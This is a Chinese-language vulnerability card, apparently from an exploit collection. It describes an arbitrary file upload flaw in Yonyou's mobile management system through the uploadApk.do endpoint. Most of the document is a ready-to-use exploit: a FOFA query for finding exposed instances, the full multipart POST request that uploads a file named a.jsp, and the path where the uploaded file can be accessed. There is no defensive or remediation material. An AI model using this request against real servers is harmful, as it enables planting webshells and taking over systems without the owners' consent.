# 用友移动管理系统uploadApk.do任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`fofa：`app="用友-移动系统管理"``
- **请求**：`POST /maportal/appmanager/uploadApk.do HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Host: xx.xx.xx.xx`　`Content-Length: 128`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"
123
--00content0boundary00--

上传文件位置
http://xx.xx.xx.xx/maupload/apk/a.jsp
```

**其他**
- 用友移动管理系统uploadApk.do任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友移动系统管理